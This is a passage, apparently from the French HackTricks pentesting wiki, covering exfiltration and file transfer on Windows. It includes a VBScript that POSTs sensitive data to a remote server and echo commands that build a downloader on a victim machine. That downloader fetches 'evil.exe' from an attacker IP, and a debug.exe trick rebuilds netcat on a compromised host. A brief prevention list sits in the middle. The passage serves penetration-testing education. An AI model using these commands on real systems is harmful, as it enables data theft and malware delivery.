#### 3. Exfiltration par HTTP

L'exfiltration par HTTP est une méthode utilisée pour envoyer des données sensibles à un serveur distant via le protocole HTTP. VBScript peut être utilisé pour envoyer des requêtes HTTP POST contenant les données sensibles.

```vbscript
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objHTTP.Open "POST", "http://serveur_distant", False
objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objHTTP.send "donnees=" & sensitiveData
```

### Prévention de l'exfiltration

Pour prévenir l'exfiltration de données sensibles, il est important de mettre en place des mesures de sécurité appropriées, telles que :

- Utiliser des pare-feu et des systèmes de détection d'intrusion pour surveiller le trafic réseau sortant.
- Mettre en place des politiques de sécurité strictes pour limiter l'accès aux données sensibles.
- Mettre à jour régulièrement les systèmes d'exploitation et les logiciels pour corriger les vulnérabilités connues.
- Sensibiliser les utilisateurs aux risques de l'ingénierie sociale et aux techniques de phishing.
- Utiliser des outils de détection d'anomalies pour identifier les comportements suspects sur le réseau.

En suivant ces bonnes pratiques de sécurité, vous pouvez réduire les risques d'exfiltration de données sensibles à partir de vos systèmes.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Victime**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

C'est une technique folle qui fonctionne sur les machines Windows 32 bits. L'idée est d'utiliser le programme `debug.exe`. Il est utilisé pour inspecter les binaires, comme un débogueur. Mais il peut également les reconstruire à partir de l'hexadécimal. Donc l'idée est que nous prenons des binaires, comme `netcat`. Ensuite, nous le désassemblons en hexadécimal, le collons dans un fichier sur la machine compromise, puis l'assemblons avec `debug.exe`.

`Debug.exe` ne peut assembler que 64 Ko. Nous devons donc utiliser des fichiers plus petits que cela. Nous pouvons utiliser upx pour le compresser encore plus. Faisons cela:
```
upx -9 nc.exe
```
Maintenant, il ne pèse que 29 ko. Parfait. Maintenant, démontons-le :
```
wine exe2bat.exe nc.exe nc.txt
```
Maintenant, nous copions-colons simplement le texte dans notre shell Windows. Et cela créera automatiquement un fichier appelé nc.exe

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menace proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
